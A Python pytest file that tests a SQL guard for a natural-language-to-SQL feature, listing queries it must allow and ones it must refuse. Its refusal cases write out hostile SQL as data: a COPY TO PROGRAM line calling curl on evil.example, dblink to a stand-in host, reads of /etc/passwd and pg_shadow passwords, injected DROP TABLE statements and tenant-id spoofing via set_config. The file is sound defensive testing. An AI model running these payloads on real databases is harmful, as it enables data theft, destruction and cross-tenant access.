"""PURE: the SQL guard's rules (docs/design/nl2sql.md §3). No database, no model.

The most security-critical tests in the project. A case here is a line of SQL and
what must happen to it.
"""

from __future__ import annotations

import pathlib

import pytest
import sqlglot

from app.semantic.model import load_vocabulary
from app.sqlguard import Catalog, Checked, Refused, check

CATALOG = Catalog(load_vocabulary().catalog())


def refused(sql: str) -> str:
    result = check(sql, CATALOG)
    assert isinstance(result, Refused), f"should have been refused: {sql}"
    assert result.reason
    return result.code


def allowed(sql: str, max_rows: int = 1000) -> Checked:
    result = check(sql, CATALOG, max_rows=max_rows)
    assert isinstance(result, Checked), f"should have passed: {sql} -> {result}"
    return result


# -- what a business question needs -------------------------------------------

ALLOWED = [
    "SELECT ROUND(SUM(total_amount - tax_amount), 2) AS revenue FROM orders "
    "WHERE status = 'completed' AND order_date BETWEEN DATE '2026-10-01' AND DATE '2026-10-31'",
    "SELECT o.name AS outlet, ROUND(SUM(x.total_amount - x.tax_amount), 2) AS revenue "
    "FROM orders x JOIN outlets o ON o.id = x.outlet_id WHERE x.status = 'completed' "
    "GROUP BY o.name ORDER BY revenue ASC LIMIT 1",
    "SELECT p.name AS product, SUM(i.quantity) AS units FROM order_items i "
    "JOIN orders o ON o.id = i.order_id JOIN products p ON p.id = i.product_id "
    "WHERE o.status = 'completed' GROUP BY p.name ORDER BY units DESC LIMIT 10",
    "SELECT COUNT(DISTINCT v.customer_id) AS customers FROM customer_visits v "
    "WHERE v.visit_date >= DATE '2026-11-01'",
    "WITH monthly AS (SELECT DATE_TRUNC('month', order_date) AS month, "
    "SUM(total_amount) AS total FROM orders GROUP BY 1) "
    "SELECT TO_CHAR(m.month, 'YYYY-MM') AS month, m.total FROM monthly m ORDER BY 1",
    "SELECT c.segment, COUNT(*) AS customers FROM customers c GROUP BY c.segment",
    "SELECT o.name, RANK() OVER (ORDER BY SUM(x.total_amount) DESC) AS position "
    "FROM orders x JOIN outlets o ON o.id = x.outlet_id GROUP BY o.name",
    "SELECT id FROM orders WHERE status = 'completed' UNION SELECT id FROM outlets",
    "SELECT COALESCE(SUM(e.amount), 0) / NULLIF(COUNT(*), 0) AS average FROM expenses e",
    "SELECT d::date AS day FROM generate_series(DATE '2026-10-01', DATE '2026-10-05', "
    "INTERVAL '1 day') AS g(d)",
    "SELECT p.name FROM products p WHERE p.name ILIKE '%coffee%'",
    "SELECT biz.orders.id FROM biz.orders",
    "SELECT COUNT(*) FILTER (WHERE status = 'cancelled') AS cancelled FROM orders",
    "SELECT EXTRACT(dow FROM order_date) AS weekday, COUNT(*) AS orders FROM orders GROUP BY 1",
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_a_legitimate_query_passes(sql: str) -> None:
    assert allowed(sql).sql.upper().startswith(("SELECT", "WITH"))


# -- SELECT only ---------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "INSERT INTO orders (id) VALUES (gen_random_uuid())",
        "UPDATE orders SET status = 'cancelled'",
        "UPDATE orders SET status = 'cancelled' RETURNING id",
        "DELETE FROM orders",
        "DROP TABLE orders",
        "DROP SCHEMA biz CASCADE",
        "ALTER TABLE orders ADD COLUMN x int",
        "TRUNCATE orders",
        "CREATE TABLE x AS SELECT id FROM orders",
        "CREATE TABLE x (id int)",
        "GRANT ALL ON orders TO PUBLIC",
        "COPY orders TO '/tmp/orders.csv'",
        "COPY (SELECT id FROM orders) TO PROGRAM 'curl evil.example'",
        "CALL some_procedure()",
        "DO $$ BEGIN DELETE FROM orders; END $$",
        "SET app.tenant_id = '00000000-0000-0000-0000-000000000000'",
        "SET LOCAL app.outlet_ids = '*'",
        "RESET ALL",
        "SHOW server_version",
        "EXPLAIN ANALYZE DELETE FROM orders",
        "VACUUM orders",
        "BEGIN",
        "COMMIT",
        "LISTEN channel",
        "MERGE INTO orders o USING outlets t ON o.id = t.id WHEN MATCHED THEN DELETE",
        "VALUES (1)",
    ],
)
def test_anything_that_is_not_a_select_is_refused(sql: str) -> None:
    assert refused(sql) in {"not_select", "parse_error"}


@pytest.mark.parametrize(
    "sql",
    [
        "WITH gone AS (DELETE FROM orders RETURNING id) SELECT id FROM gone",
        "WITH changed AS (UPDATE orders SET status = 'x' RETURNING id) SELECT id FROM changed",
        "WITH added AS (INSERT INTO outlets (name) VALUES ('x') RETURNING id) SELECT id FROM added",
    ],
)
def test_a_write_hidden_inside_a_select_is_refused(sql: str) -> None:
    assert refused(sql) == "not_select"


@pytest.mark.parametrize(
    ("sql", "code"),
    [
        ("SELECT id INTO stolen FROM orders", "not_read_only"),
        ("SELECT id FROM orders FOR UPDATE", "not_read_only"),
        ("SELECT id FROM orders FOR SHARE", "not_read_only"),
    ],
)
def test_a_select_that_writes_or_locks_is_refused(sql: str, code: str) -> None:
    assert refused(sql) == code


# -- one statement ---------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT id FROM orders; DROP TABLE orders",
        "SELECT id FROM orders;DELETE FROM orders;",
        "SELECT id FROM orders; SELECT id FROM outlets",
        "SELECT id FROM orders;\n-- harmless\nUPDATE orders SET status = 'x'",
        "SELECT id FROM orders /* ; */ ; TRUNCATE orders",
        "SELECT 1; SET app.tenant_id = 'x'; SELECT id FROM orders",
    ],
)
def test_more_than_one_statement_is_refused(sql: str) -> None:
    assert refused(sql) == "multiple_statements"


def test_a_trailing_semicolon_alone_is_fine() -> None:
    assert allowed("SELECT id FROM orders;").sql == "SELECT id FROM orders LIMIT 1000"


# -- SQL injection through a "value" -------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        # what a model might write if a question smuggled SQL into a name
        "SELECT p.name FROM products p WHERE p.name = ''; DROP TABLE orders; --'",
        "SELECT p.name FROM products p WHERE p.name = 'x' UNION SELECT u.email FROM app.users u",
        "SELECT p.name FROM products p WHERE p.name = 'x' OR 1 = 1; DELETE FROM orders",
        "SELECT p.name FROM products p WHERE p.name = 'x' UNION SELECT c.phone FROM customers c",
        "SELECT p.name FROM products p WHERE p.sku = set_config('app.tenant_id', 'x', true)",
    ],
)
def test_injected_sql_is_refused_by_what_it_tries_to_do(sql: str) -> None:
    refused(sql)


def test_text_that_only_looks_dangerous_inside_a_string_is_data() -> None:
    result = allowed("SELECT p.name FROM products p WHERE p.name = 'x''; DROP TABLE orders; --'")
    # still inside the quotes: a value to compare with, not a statement
    assert result.sql == (
        "SELECT p.name FROM products AS p WHERE p.name = 'x''; DROP TABLE orders; --' LIMIT 1000"
    )
    assert len(sqlglot.parse(result.sql, read="postgres")) == 1


def test_comments_do_not_survive() -> None:
    result = allowed("SELECT id /* hidden */ FROM orders -- trailing\n")
    assert "hidden" not in result.sql and "trailing" not in result.sql


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT id FROM orders WHERE id = $1",
        "SELECT id FROM orders WHERE status = %s",
        "SELECT id FROM orders WHERE status = :status",
    ],
)
def test_placeholders_are_refused(sql: str) -> None:
    assert refused(sql) == "parse_error"


# -- tables ----------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT email FROM app.users",
        "SELECT u.email FROM users u",
        "SELECT name FROM app.tenants",
        "SELECT question FROM app.query_log",
        "SELECT rolname FROM pg_catalog.pg_authid",
        "SELECT rolname FROM pg_roles",
        "SELECT usename, passwd FROM pg_shadow",
        "SELECT table_name FROM information_schema.tables",
        "SELECT relname FROM pg_class",
        'SELECT email FROM "app"."users"',
        "SELECT email FROM APP.USERS",
        "SELECT id FROM otherdb.biz.orders",
        "SELECT id FROM public.orders",
        "SELECT o.id FROM orders o JOIN app.users u ON u.id = o.customer_id",
        "SELECT id FROM orders WHERE customer_id IN (SELECT id FROM app.users)",
        "SELECT version FROM schema_migrations",
    ],
)
def test_a_table_outside_the_allow_list_is_refused(sql: str) -> None:
    assert refused(sql) == "table_not_allowed"


def test_a_cte_may_not_borrow_the_name_of_a_real_schema() -> None:
    assert refused("WITH users AS (SELECT id FROM orders) SELECT email FROM app.users") == (
        "table_not_allowed"
    )


# -- columns ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT c.phone FROM customers c",
        "SELECT c.email FROM customers c",
        "SELECT c.name FROM customers c",
        "SELECT name FROM customers",
        "SELECT phone FROM customers",
        "SELECT x.email FROM (SELECT c.email FROM customers c) x",
        "SELECT c.segment FROM customers c WHERE c.email LIKE '%@gmail.com'",
        "SELECT c.segment FROM customers c ORDER BY c.phone",
        "SELECT COUNT(*) FROM customers c GROUP BY c.name",
        "SELECT s.contact_name FROM suppliers s",
        "SELECT s.phone FROM suppliers s",
        "WITH p AS (SELECT c.id, c.phone FROM customers c) SELECT p.phone FROM p",
        "SELECT o.id FROM orders o JOIN customers c ON c.id = o.customer_id AND c.email <> ''",
    ],
)
def test_a_private_column_is_refused_wherever_it_appears(sql: str) -> None:
    assert refused(sql) == "column_not_allowed"


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT nonexistent FROM orders",
        "SELECT o.salary FROM orders o",
        "SELECT id FROM orders o JOIN outlets t ON t.id = o.outlet_id",  # which id?
    ],
)
def test_an_unknown_or_ambiguous_column_is_refused(sql: str) -> None:
    assert refused(sql) == "column_not_allowed"


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM orders",
        "SELECT c.* FROM customers c",
        "SELECT o.*, c.segment FROM orders o JOIN customers c ON c.id = o.customer_id",
        "TABLE customers",
        "SELECT x.* FROM (SELECT id FROM orders) x",
    ],
)
def test_star_is_refused(sql: str) -> None:
    assert refused(sql) == "star_not_allowed"


def test_count_star_is_not_a_star() -> None:
    allowed("SELECT COUNT(*) AS orders FROM orders")


def test_the_private_columns_are_not_in_the_catalog_at_all() -> None:
    assert set(CATALOG.tables["customers"]) == {"id", "segment", "city", "joined_on"}
    assert "contact_name" not in CATALOG.tables["suppliers"]
    assert all("tenant_id" not in columns for columns in CATALOG.tables.values())


# -- functions -------------------------------------------------------------------


@pytest.mark.parametrize(
    "call",
    [
        "set_config('app.tenant_id', '00000000-0000-0000-0000-000000000000', true)",
        "current_setting('app.tenant_id')",
        "pg_sleep(30)",
        "pg_read_file('/etc/passwd')",
        "pg_read_binary_file('/etc/passwd')",
        "pg_ls_dir('/')",
        "lo_import('/etc/passwd')",
        "lo_export(1, '/tmp/x')",
        "query_to_xml('SELECT * FROM app.users', true, true, '')",
        "dblink_connect('host=evil.example')",
        "pg_terminate_backend(1)",
        "pg_cancel_backend(1)",
        "pg_advisory_lock(1)",
        "version()",
        "current_user",
        "session_user",
        "current_database()",
        "current_schema()",
        "inet_server_addr()",
        "pg_backend_pid()",
        "has_table_privilege('app.users', 'select')",
        "txid_current()",
        "nextval('some_seq')",
        "gen_random_uuid()",
        "random()",
        "repeat('x', 1000000000)",
    ],
)
def test_a_function_outside_the_allow_list_is_refused(call: str) -> None:
    assert refused(f"SELECT {call}") == "function_not_allowed"
    assert refused(f"SELECT id FROM orders WHERE {call} IS NOT NULL") == "function_not_allowed"


def test_a_forbidden_function_as_a_table_is_refused() -> None:
    assert refused("SELECT t.x FROM dblink('host=evil', 'SELECT 1') AS t(x int)") == (
        "function_not_allowed"
    )


# -- the limit -------------------------------------------------------------------


@pytest.mark.parametrize(
    ("sql", "expected"),
    [
        ("SELECT id FROM orders", 1000),
        ("SELECT id FROM orders LIMIT 5", 5),
        ("SELECT id FROM orders LIMIT 1000000", 1000),
        ("SELECT id FROM orders LIMIT ALL", 1000),
        ("SELECT id FROM orders FETCH FIRST 7 ROWS ONLY", 7),
        ("SELECT id FROM orders LIMIT (SELECT 999999)", 1000),
        ("SELECT id FROM orders UNION ALL SELECT id FROM orders", 1000),
    ],
)
def test_the_outer_query_always_ends_with_a_limit_within_the_cap(sql: str, expected: int) -> None:
    result = allowed(sql)
    assert result.limited_to == expected
    assert result.sql.endswith(f"LIMIT {expected}")


def test_the_cap_is_configurable() -> None:
    assert allowed("SELECT id FROM orders", max_rows=25).sql.endswith("LIMIT 25")


# -- size, depth and nonsense ------------------------------------------------------


def test_a_very_long_query_is_refused_without_being_parsed() -> None:
    assert refused("SELECT id FROM orders WHERE id IN (" + "1," * 5000 + "1)") == "too_large"


def test_deep_nesting_is_refused() -> None:
    sql = "SELECT id FROM orders"
    for _ in range(8):
        sql = f"SELECT x.id FROM ({sql}) x"
    assert refused(sql) == "too_large"


@pytest.mark.parametrize(
    "sql",
    ["", "   ", ";", "SELEC id FROM orders", "SELECT FROM WHERE", "not sql at all", "(((", "'"],
)
def test_nonsense_is_refused_and_never_raises(sql: str) -> None:
    assert isinstance(check(sql, CATALOG), Refused)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT id FROM orders WHERE status = 'ｃompleted'",  # a full-width letter in a value
        "SELECT id FROM orders WHERE status = 'x'",  # a non-breaking space
        "/*!50000 DROP TABLE orders */ SELECT id FROM orders",  # a MySQL-style trick comment
        "SELECT id FROM orders WHERE order_no = $tag$; DROP TABLE orders; $tag$",
    ],
)
def test_odd_input_is_either_passed_as_one_select_or_refused(sql: str) -> None:
    result = check(sql, CATALOG)
    if isinstance(result, Checked):
        assert result.sql.upper().startswith("SELECT")
        assert "DROP TABLE" not in result.sql.upper().split("'")[0]


# -- what comes out ----------------------------------------------------------------


def test_what_runs_is_printed_from_the_tree_not_copied_from_the_input() -> None:
    result = allowed("select   ID\nfrom   ORDERS   where STATUS='completed'")
    assert result.sql == "SELECT ID FROM ORDERS WHERE STATUS = 'completed' LIMIT 1000"
    assert result.tables == frozenset({"orders"})


def test_the_guard_package_imports_nothing_from_the_rest_of_the_app() -> None:
    package = pathlib.Path(__file__).resolve().parents[3] / "app" / "sqlguard"
    for file in package.glob("*.py"):
        for line in file.read_text().splitlines():
            if line.startswith(("from app.", "import app.")):
                assert line.startswith(("from app.sqlguard", "import app.sqlguard")), (
                    f"{file.name}: {line}"
                )
